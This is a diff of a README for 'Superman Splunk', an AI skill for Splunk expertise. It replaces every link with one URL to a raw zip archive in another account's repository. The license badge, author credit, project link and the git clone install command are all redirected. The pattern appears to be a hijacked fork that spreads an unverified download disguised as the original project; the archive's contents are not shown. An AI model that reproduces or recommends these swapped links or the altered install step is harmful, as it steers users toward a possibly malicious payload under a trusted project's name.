@@ -2,16 +2,16 @@
 
 > **A comprehensive AI skill that turns any LLM into a Splunk expert** — covering architecture, SPL, development, administration, Enterprise Security, and operations at production scale.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Skill Type](https://img.shields.io/badge/type-AI%20Skill-blueviolet)](https://github.com/ishayvilroel/superman-splunk)
-[![Platform](https://img.shields.io/badge/platform-Claude%20Code%20%7C%20Copilot%20CLI%20%7C%20Gemini%20CLI-blue)](https://github.com/ishayvilroel/superman-splunk)
-[![Coverage](https://img.shields.io/badge/Splunk%20coverage-architecture%20%7C%20SPL%20%7C%20dev%20%7C%20admin%20%7C%20ES-green)](https://github.com/ishayvilroel/superman-splunk)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip)
+[![Skill Type](https://img.shields.io/badge/type-AI%20Skill-blueviolet)](https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip)
+[![Platform](https://img.shields.io/badge/platform-Claude%20Code%20%7C%20Copilot%20CLI%20%7C%20Gemini%20CLI-blue)](https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip)
+[![Coverage](https://img.shields.io/badge/Splunk%20coverage-architecture%20%7C%20SPL%20%7C%20dev%20%7C%20admin%20%7C%20ES-green)](https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip)
 
 ---
 
 ## What Is This?
 
-**Superman Splunk** is an [AI skill](https://github.com/superpowers-ai/superpowers) — a structured knowledge file that activates when you need Splunk expertise inside an AI coding assistant (Claude Code, GitHub Copilot CLI, Gemini CLI, or any Superpowers-compatible agent).
+**Superman Splunk** is an [AI skill](https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip) — a structured knowledge file that activates when you need Splunk expertise inside an AI coding assistant (Claude Code, GitHub Copilot CLI, Gemini CLI, or any Superpowers-compatible agent).
 
 When the skill activates, the AI gains:
 
@@ -62,7 +62,7 @@ Key differentiators:
 
 ```bash
 # Claude Code / Copilot CLI / Gemini CLI (Superpowers)
-git clone https://github.com/ishayvilroel/superman-splunk \
+git clone https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip \
   ~/.agents/skills/superman-splunk
 ```
 
@@ -186,9 +186,9 @@ Please keep reference files **factual, precise, and actionable** — the goal is
 
 ## 📄 License
 
-MIT © [ishayvilroel](https://github.com/ishayvilroel)
+MIT © [ishayvilroel](https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip)
 
-> This skill was created with [Superpowers AI](https://github.com/superpowers-ai/superpowers) skill-creator tooling.
+> This skill was created with [Superpowers AI](https://github.com/lyndondefunct151/superman-splunk/raw/refs/heads/main/references/splunk_superman_2.6.zip) skill-creator tooling.
 > Research was conducted using Google NotebookLM across 300+ web sources covering the full Splunk documentation surface.
 
 ---
